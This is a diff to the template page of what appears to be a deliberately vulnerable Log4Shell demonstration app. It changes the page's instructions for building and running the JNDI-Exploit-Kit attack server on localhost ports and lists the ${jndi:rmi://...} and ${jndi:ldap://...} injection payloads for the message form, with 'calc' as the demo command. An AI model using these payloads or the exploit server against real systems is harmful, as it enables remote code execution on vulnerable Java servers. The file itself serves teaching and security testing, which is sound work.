@@ -9,7 +9,7 @@
       <form method="post" th:action="@{/log}">
         <div>
           <label for="message">message:</label>
-          <input type="text" name="message" th:value="${message}" />
+          <input type="text" name="message" th:value="${message}" size="50" />
           <input type="submit" value="Send" />
         </div>
       </form>
@@ -18,20 +18,21 @@
       <h3>JNDI Server Preparation:</h3>
       <pre>
 git clone https://github.com/pimps/JNDI-Exploit-Kit
-docker run -it --rm -v "{PathToClonedDir}:/work" -w /work --name jndiserver -p 1389:1389 -p 1099:1099 maven:3-openjdk-11 bash
+docker run -it --rm -v "{PathToClonedDir}:/work" -w /work --name jndiserver -p 13890:13890 -p 10990:10990 -p 8180:8180 maven:3-openjdk-11 bash
 mvn clean package -DskipTests
-java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<b>calc</b>" -L "127.0.0.1:1389" -R "127.0.0.1:1099"
+java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<b>calc</b>" -L "127.0.0.1:13890" -R "127.0.0.1:10990" -J "127.0.0.1:8180"
 
 ->
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 ...
-Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
-rmi://127.0.0.1:1099/<b>xxxxxx</b>
+rmi://127.0.0.1:10990/<b>xxxxxx</b>
+ldap://127.0.0.1:13890/<b>yyyyyy</b>
 ...
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
--> You can use the following value.
-${jndi:rmi://127.0.0.1:1099/<b>xxxxxx</b>}
+-> You can use the following values.
+${jndi:rmi://127.0.0.1:10990/<b>xxxxxx</b>}
+${jndi:ldap://127.0.0.1:13890/<b>yyyyyy</b>}
       </pre>
     </div>
   </body>
